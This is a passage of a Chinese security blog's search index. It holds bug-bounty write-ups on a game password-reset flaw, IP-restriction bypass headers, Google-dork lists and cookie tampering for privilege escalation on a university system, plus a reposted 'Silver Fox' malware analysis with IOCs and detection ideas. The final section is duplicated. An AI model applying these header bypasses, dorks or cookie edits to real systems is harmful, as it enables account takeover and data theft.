","date":"2024-09-02","objectID":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["SRC"],"title":"比较有意思的几个漏洞挖掘记录","uri":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/#sql-注入"},{"categories":["学习"],"content":" 任意用户名密码重置玩的某个游戏，手机号换了，申诉成功给我发了邮件，可以看到 id 和 token 这里直接更换 id 访问，进行更改密码，显示错误 简单测了测，id 随便改，token 为空 直接修改密码成功 这里因为不知道目标账号的 id，只能随机修改，因为手机号基本就跟 id 绑定，于是找到了申诉的功能点，这里输入手机号 可以看到返回了 id 下一步就是要知道目标的手机号，经过我的不懈寻找，在游戏 app 的登录界面，有个忘记账号功能 这里输入手机号或者游戏的 uid 就可以看到一些信息 这里游戏 uid 是公开的，资料就能看到，不过手机号只有前三位和后四位 在官网找回密码处，这里输入手机号抓个包 输入不对的手机号会提示错误，因为我们知道前三位还有后四位，爆破起来还是很快的 最后只得到几个真实存在的手机号，这时候就可以去游戏 app 登陆界面去对比，手机号正确的话，返回的 UID 是一样的，这里也可以抓包写个脚本去判断，因为真实存在手机号就几个，我就直接手动尝试的 确定了目标手机号就知道了 id，就可以想修改谁的密码就可以修改谁的了 ","date":"2024-09-02","objectID":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["SRC"],"title":"比较有意思的几个漏洞挖掘记录","uri":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/#任意用户名密码重置"},{"categories":["学习"],"content":" 某站测试记录目标站主域名有两个，a 和 b 代替 ，这里主要目标是 a，b 应该是以前用的，首先是爆破出来了两个 demo 站 demo.atest.com 和 demo.btest.com 会提示 ip 无法访问，访问 demo.btest.com 另外一个也一样 这里直接插 xff 头绕过的 X-Forwarded-For: 127.0.0.1 X-Forwarded:127.0.0.1 Forwarded-For:127.0.0.1 Forwarded:127.0.0.1 X-Requested-With:127.0.0.1 X-Forwarded-Proto:127.0.0.1 X-Forwarded-Host:127.0.0.1 X-remote-lP:127.0.0.1 X-remote-addr:127.0.0.1 True-Client-lP: 127.0.0.1 X-Client-lP:127.0.0.1 Client-lP: 127.0.0.1 X-Real-IP:127.0.0.1 Ali-CDN-Real-IP:127.0.0.1 Cdn-Src-lp:127.0.0.1 Cdn-Real-lp:127.0.0.1 CF-Connecting-lP:127.0.0.1 X-Cluster-Client-lP:127.0.0.1 WL-Proxy-Client-lP:127.0.0.1 Proxy-Client-lP:127.0.0.1 Fastly-Client-lp: 127.0.0.1 True-Client-lp: 127.0.0.1 X-Originating-lP:127.0.0.1 X-Host: 127.0.0.1 X-Custom-lP-Authorization:127.0.0.1 这里是创建订单成功了，返回了一个地址，https://cashier.xxxx.xxxx 访问之后 因为这是订单信息，所以我猜测前面子域名是后台的 构造https://cashier.atest.com 访问之后 401，添加 xff 头直接访问 这里 a 网站应该也是一样的规则 因为是测试后台，这里直接将 test 删除，访问https://cashier.a.com 显示无法访问，修改 xff 头仍然失败 只能从测试站入手了，首先是爆破出来了用户密码，但是却无法登录，不过返回了 token，这里前端看到了 webpack 的接口信息 在 JS 存在好多接口和接口配置包的构造并且还有 API 路径 抓个登录接口的包看下格式拼接就好 有的接口有未授权，有的接口需要权限，但是爆破成功的数据包里面是有返回 token 的，于是带着这个 token 访问就可以了，但是均为测试站点的数据 于是猜测管理后台地址也是有这些接口的，直接更换请求的 host，成功获取到真实数据 ","date":"2024-09-02","objectID":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["SRC"],"title":"比较有意思的几个漏洞挖掘记录","uri":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/#某站测试记录"},{"categories":["逆向"],"content":" 转载自： https://forum.butian.net/share/3705 ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:0:0","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#"},{"categories":["逆向"],"content":" 一、前言大家好，我是来自顺丰安全成文实验室的一名老兵，代号“PX0”，我的任务是追踪威胁情报，深入分析最新黑灰产动向。近期，实验室捕获到一组“银狐”样本，经查，样本来源于伪装成主流会议软件的网站，网站通过提高搜索引擎的收录权重来诱骗用户下载该病毒软件。 此前我也曾分析过“银狐”相关样本，但这回的新版本，免杀技术简直出神入化，主流的安全软件几乎拿它没辙。这让我心里直犯嘀咕：“难道真的有免杀界的高手‘叛变’，跑去给黑灰产当军师了？”不过别担心，接下来，就让我来带大家揭秘这位高手的免杀大招，再教大家几个怎么识别和防住它的高招！ ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:1:0","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#一前言"},{"categories":["逆向"],"content":" 二、本文关注点 此银狐分支样本在出现阶段，主流沙箱、EDR 几乎无法检测，本文主要分享新增部分功能 攻击者更加注重杀软和防御能力对抗，引入了 bypass 检测、防病毒模拟器检测、RPC 构建持久化 样本的进化更倾向于多段的内存加载、运行时动态解密，后续可能会出现 rootkit 类型的完全隐蔽后门 根据样本的函数代码通用特征提取检测规则、检测思路分享 ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:2:0","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#二本文关注点"},{"categories":["逆向"],"content":" 三、正文分析","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:0","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#三正文分析"},{"categories":["逆向"],"content":" 1、加载过程在近期捕获的一批样本中，初始投递的加载器代码几乎一致，攻击者通过最少的 API 调用完成第一阶段的 shellcode 加载 (对通用杀毒软件来说，敏感 API 调用越少，风险相对越小)； shellcode 加载完成后，通过内联 jmp rbx 跳转 0x1B0000 执行，这里其实是有一步 mov 的地址转移操作，作用是避免出现 jmp rax 的明显内存调用特征，在 8 月迭代样本也出现了其他的寄存器调用； ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:1","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#1加载过程"},{"categories":["逆向"],"content":" 2、解密过程进入 shellcode 内部，实际只有 call 一个有效指令，后续的所有字节都是加密状态；这类似 cobaltstrike 睡眠解密，此类函数适合作为检测特征，区别是此函数需在程序启动时检测； 解密函数即运行时的内部计算，进行了一系列循环右移、减法和取反操作，用于动态解密后续指令； 经对比可以看出，右侧部分指令被解密，被解密出来的部分实际是一个新的异或解密函数； 经过长期跟踪发现，此函数出现在银狐多个版本，为了更清楚地了解功能和检测，我们代码还原这个函数； unsigned char key = 0x91; 从内存可以看到整个倒序解密的过程，运行完成后，整块 shellcode 代码被解密完成； ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:2","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#2解密过程"},{"categories":["逆向"],"content":" 3、环境检测、绕过解密完成后首先进入 sub_99A5 函数，此函数集成一些 bypass 和环境检测能力，是对比以往样本的增强部分； 首先是 bypass ETW 和 AMSI，实现方式完全相同；都是通过 patch 到对应函数开头一个 0x3C 字节即 ret 指令，完成扫描、日志输出的代码跳过； ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:3","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#3环境检测绕过"},{"categories":["逆向"],"content":" 4、模拟环境检测微软防病毒为首次扫描的程序提供了特殊的二进制模拟器环境，会附带一些虚拟模块和预定返回值；接下来的几个 check 函数是关联性代码，整体功能是为了检测 Defender 模拟环境； 判断程序名，如果匹配 v5 数组中的:\\myapp.exe(模拟进程名称，不是实际运行的进程)则退出进程； 以下是对防病毒模拟器初始化功能的部分逆向代码(详细内容可以参考 2018 年 BlackHat)； 此函数使用两个未公开函数获取 ntdll 的导出表，并通过自定义 ror 算法计算 apiHash(ntdll 运行时模拟函数)，如果命中任意 3 个 Mpclient 函数 hash 则返回错误码 0xC0000462，再通过上层函数判断退出进程； 分别调用 Windows 内核函数 NtIsProcessInJob 和 NtCompressKey 传入无效句柄，判断是否会返回虚拟模块的预定值，返回预期值则退出进程； ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:4","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#4模拟环境检测"},{"categories":["逆向"],"content":" 5、防御绕过传入无效标识符，尝试动态加载 COM 类对象，判断返回值 CLASS_E_CLASSNOTABAILABLE 是否符合预期； 在堆分配一块较大的内存空间，尝试是否可以成功，通过这种方式验证系统环境； 调用 VirtualAllocExNuma 函数申请物理内存，此函数的运行环境要求存在多个物理 CPU；判断 SxIn.dll 模块是否被当前进程加载(360 沙箱的分析 dll) ； 获取 SYSTEM_INFO 结构体，该结构体包含系统的硬件信息 ，判断处理器数量； 获取当前主机名，通过主机名字符创建互斥体对象，判断是否存在； 获取令牌信息，判断进程是否能提升权限，尝试 runas 以管理员身份启动，进入死循环(用户未通过会无限弹窗) 判断 c:\\\\xxxx.ini 文件是否存在，此文件默认由 Gh0st 后门创建； 通过 GetTickCount64 函数来测量 Sleep 调用前后的时间差，判断环境是否加速，__rdtsc()函数同理； ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:5","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#5防御绕过"},{"categories":["逆向"],"content":" 6、防御削弱通过扫描进程列表、服务进程、检索窗口类综合判断 360 杀软是否存在，综合来看攻击者更倾向于个人电脑； 通过 API 发送线程消息、控制信号尝试关闭 360 杀软，若失败跳转到后续代码下载 BYOVD 驱动模块结束杀软； 检测 WindowsDefender 防病毒相关进程服务是否存在; 执行 powershell 命令添加 C:\\ProgramData 和 C:\\User\\Public 目录到扫描排除项(后门存放路径)， 在 8 月的版本中会新增 Program Files (x86)目录； 攻击者整体使用凯撒密码对字符串解密，此算法比较简单，使用固定 key 进行逐字节移位； 此处解密完成后得到存储桶地址；根据地址表下载一组后门文件，下载完成后根据偏移标识填入随机值，使得下载文件没有固定 hash(在以往的样本中，银狐会通过多种方式实现此功能)； 下载后的文件会随机存储在 C:\\Users\\Public 目录，并在下层创建随机字符目录；在某些版本，会另外下载一组后门隐藏在 C:\\ProgramData 目录中； 下载 BYOVD 驱动模块，当进程权限不足时跳过此部分；payload 下载完成后以内存 dll 形式解压，并获取导出函数指针，再使用 RPC 管道构建计划任务配置并调用 NdrClientCall3 函数创建，此任务用于维持 BYOVD 模块； 此驱动漏洞属于 EDR Killer 类型，可以通过传入特定的控制码 0x22E044 和进程 pid 在内核强制结束对应的进程； 驱动内部会根据传入控制码触发调用，通过 IOCTL(IO control codes)命令执行结束进程(支持 Win11)； ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:6","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#6防御削弱"},{"categories":["逆向"],"content":" 7、后门远控后门程序使用一组白加黑配合两个加密的 payload 文件， 这是银狐的惯用手法；dll 使用 VMProtect 保护，运行后使用 RC4 算法对 payload 进行解密，完成后加载 log.src 文件，再次解密得到内存 dll(VMProtect 保护)； 获取内存 dll 的导出函数 CLRCreateInstance，此函数内部会为后门程序创建持久化任务、禁用 UAC 等功能； 最后会加载 vcxproj 后缀文件解密，完成后得到 Gh0st 变种后门，上线前会请求 ip 地址表，查看是否更新； Gh0st 包含很多功能模块，具体功能此处不详细介绍了，后门还包含一些固定的 cmd 命令，适合作为检测补充； ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:3:7","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#7后门远控"},{"categories":["逆向"],"content":" 四、检测思路分享 创建 yara 规则 可以通过程序中的加解密函数代码创建 yara 规则，代码结构最好连续且固定； TTPs 检测特征 通过攻击者样本或实际应急过程中发现的 TTPs 作为检测特征； IOC 检测 在威胁情报痛苦金字塔的下三层中，域名相对更有效，也可根据情况选择 hash 检测； B736A809E7A0F1603C97D43BBC7D2EA8A9CD080B A672825339ADBB5EEEF8176D161266D4E4A4A625 E49938CB6C4CE0D73DB2B4A32018B1FF71A2D7F0 9CAA4EC93CE1CD40BD5975645A110A4325310A3B D7F41D457C8358AF840B06914D1BC969EF7939D0 48B2090FDCEA7D7C0EB1544EBCDAF911796A7F67 omss.oss-cn-hangzhou.aliyuncs.com upitem.oss-cn-hangzhou.aliyuncs.com 1o2.oss-cn-beijing.aliyuncs.com 25o.oss-cn-beijing.aliyuncs.com 98o.oss-cn-beijing.aliyuncs.com vauwjw.net cinskw.net hucgiu.net （针对样本的具体 yara、TTPs 规则等，后续将会同步到顺丰安全应急响应中心预推出的成文实验室知识星球，敬请期待！） ","date":"2024-09-02","objectID":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/:4:0","series":null,"tags":["病毒分析"],"title":"免杀大佬加入黑灰产还打得过吗","uri":"/%E5%85%8D%E6%9D%80%E5%A4%A7%E4%BD%AC%E5%8A%A0%E5%85%A5%E9%BB%91%E7%81%B0%E4%BA%A7%E8%BF%98%E6%89%93%E5%BE%97%E8%BF%87%E5%90%97/#四检测思路分享"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/3693 ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:0:0","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#"},{"categories":["学习"],"content":" 记:一次经典教育系统后台漏洞打包!","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:1:0","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#记一次经典教育系统后台漏洞打包"},{"categories":["学习"],"content":" 前言:小编认为像什么什么大学比较显眼的 “统一认证登录”||“学生综合管理”,基本上弱口令是不太行,别的漏洞的话好多也都被大佬们打完了或者利用上不太容易(菜鸟的内心崩塌)，对于自己渗透能力的有限，信息收集就尤为重要! 既然主站打不了，就打旁站吧！（基本的方式都是通用的） 这里先分享一下小编自用的谷歌语法：谷歌语法基础的符号： “xxx”: 将要搜索的关键字用引号括起来 (表示完全匹配，即关键词不能分开，顺序也不能变) 例如：腾讯课堂如果不加“ ”的话，就会针对腾讯和课堂进行拆分，既对腾讯进行搜索也对课堂进行搜索，所以加上“ ”的话就会对腾讯课堂进行绑定，只对腾讯课堂进行搜索 +：“xxx” +baidu.com 搜索 xxx 与 baidu.com 相关的内容 例如：腾讯课堂 +ke.qq.com，那么这里就会显示 ke.qq.com 相关的内容 -：“xxx” -baidu.com 搜索结果里面除去 baidu.com 相关的内容 例如：腾讯课堂 -ke.qq.com，这里再搜索的时候，就会把这个网址屏蔽掉 谷歌语法的基础使用 在渗透测试的过程中，运用谷歌语法能快速地帮我们找到可能存在漏洞的页面 谷歌语法常用搜索参数： site： 指定域名，如：site:edu.cn 搜索教育网站 inurl： 用于搜索包含的 url 关键词的网页，如：inurl:uploads 文件上传，搜索关于公司有关的网址中含有 login 的网页， intitle： 搜索网页标题中的关键字，如： intitle:“index of /admin” robots.txt intitle:“robots.txt” intext： 搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码 filetype： 按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp cache： 已经删除的缓存网页，推荐组合使用 谷歌语法拓展 查找后台 site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user 查找 sql 注入漏洞 inurl:.php?id=23 公司 inurl:.asp?id=11 查找上传点： site:xx.com inurl:file| uploadfile 查找敏感信息泄露 intitle:“Index of /admin” intitle:“Index of /root” intitle:“Index of /” +password.txt intitle:phpinfo()或者 inurl:phpinfo.php 查找未授权访问phpmyadmin inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin 这次案例就是：site:xxx.edu.cn “管理登录”||“登录”||“用户登录” 由于一次意外经历，意外获得该学校的秘密规律（方式有且不限于用户手册/小程序），所以是一场有针对性的后台登录 ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:2:0","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#前言"},{"categories":["学习"],"content":" 某实践教学毕设管理平台像这一种一眼二开的老旧学校管理系统，就感觉有戏，不出所料利用收集到的密码规律也是成功登陆了 ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:0","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#某实践教学毕设管理平台"},{"categories":["学习"],"content":" 信息泄露进来直接就给了惊喜（学生账号也能看到同学和老师）个人感觉这种毕设学校都是这样整的 直接发现大量学号规律，已经算是信息泄露了，但是都进来了哪有那么容易走， 于是开始用自己三脚猫功夫–再加上又有学号规律，可以试试越权咯！ ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:1","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#信息泄露"},{"categories":["学习"],"content":" 越权测试翻了翻功能点发现有个修改密码，哎！好像这类一般有越权修改密码哦！开搞 点击修改密码抓包： 发现可以修改的参数都在 cookie 里面： ASP.NET_SessionId 这一看就是加密签名咯（能力有限留给逆向大佬） OA_User=id=54598 （感觉跟用户 id 有关系） unumber 和 ip 分别是用户名和 IP 地址（感觉也没法改） Powerid= 6 (这个个位数参数猜测是权限上面的） （注意）这里面我在每一次点击功能点时会连续抓取 4~5 个包，为了达成越权目的必须确保每一个数据包都进行修改！！ 尝试修改 OA_User=id= 54597 （先减一位然后再减一位） 发现对应的用户名也是对应着改变，（只是不和 id 匹配） 哎！这不就是直接可以越权修改密码！水平越权有了！ 扩展：垂直越权不过这些都是修改 OA_User=id= 发现都是便利的一些学生 id，就想下能不能 get 到教师或者管理员 记得还有个参数 Powerid= 6 便利学生的时候就发现有些 id 是遍历不出来的（这些可能就是管理员/教师）其中就有一个 id 是 5. 为了方便确定信息这次点击个人基本信息 1.通过遍历结果尝试修改 OA_User=id=54590 powerid=5 发现和我猜测的一样 ‘5’ 就是教师权限！拿到老师权限同样也是可以直接越权修改老师密码! 2.老师权限都试出来了，就想着管理员！！！ 划重点这里,通过遍历发现 40000-55000 都是可以便利的点,管理员这里面并没有出现! 所以说:一般这种系统管理员权限特殊会比较特殊，根据小编多年扣脚的经验 ，管理员 id=1，（这一点适用于大多数管理系统），同时权限做出的是数字越小权限越大，这里 powerid=1 放包注意和上面一样 成功拿到管理员权限！泄露大量账号密码信息： 测试添加用户 直接可以任意添加管理员和导师账户！（声明：所有测试账户均已经删除，仅为测试所用） 同样，进行功能点抓包修改可以越权修改管理员密码！ ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:2","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#越权测试"},{"categories":["学习"],"content":" 越权测试翻了翻功能点发现有个修改密码，哎！好像这类一般有越权修改密码哦！开搞 点击修改密码抓包： 发现可以修改的参数都在 cookie 里面： ASP.NET_SessionId 这一看就是加密签名咯（能力有限留给逆向大佬） OA_User=id=54598 （感觉跟用户 id 有关系） unumber 和 ip 分别是用户名和 IP 地址（感觉也没法改） Powerid= 6 (这个个位数参数猜测是权限上面的） （注意）这里面我在每一次点击功能点时会连续抓取 4~5 个包，为了达成越权目的必须确保每一个数据包都进行修改！！ 尝试修改 OA_User=id= 54597 （先减一位然后再减一位） 发现对应的用户名也是对应着改变，（只是不和 id 匹配） 哎！这不就是直接可以越权修改密码！水平越权有了！ 扩展：垂直越权不过这些都是修改 OA_User=id= 发现都是便利的一些学生 id，就想下能不能 get 到教师或者管理员 记得还有个参数 Powerid= 6 便利学生的时候就发现有些 id 是遍历不出来的（这些可能就是管理员/教师）其中就有一个 id 是 5. 为了方便确定信息这次点击个人基本信息 1.通过遍历结果尝试修改 OA_User=id=54590 powerid=5 发现和我猜测的一样 ‘5’ 就是教师权限！拿到老师权限同样也是可以直接越权修改老师密码! 2.老师权限都试出来了，就想着管理员！！！ 划重点这里,通过遍历发现 40000-55000 都是可以便利的点,管理员这里面并没有出现! 所以说:一般这种系统管理员权限特殊会比较特殊，根据小编多年扣脚的经验 ，管理员 id=1，（这一点适用于大多数管理系统），同时权限做出的是数字越小权限越大，这里 powerid=1 放包注意和上面一样 成功拿到管理员权限！泄露大量账号密码信息： 测试添加用户 直接可以任意添加管理员和导师账户！（声明：所有测试账户均已经删除，仅为测试所用） 同样，进行功能点抓包修改可以越权修改管理员密码！ 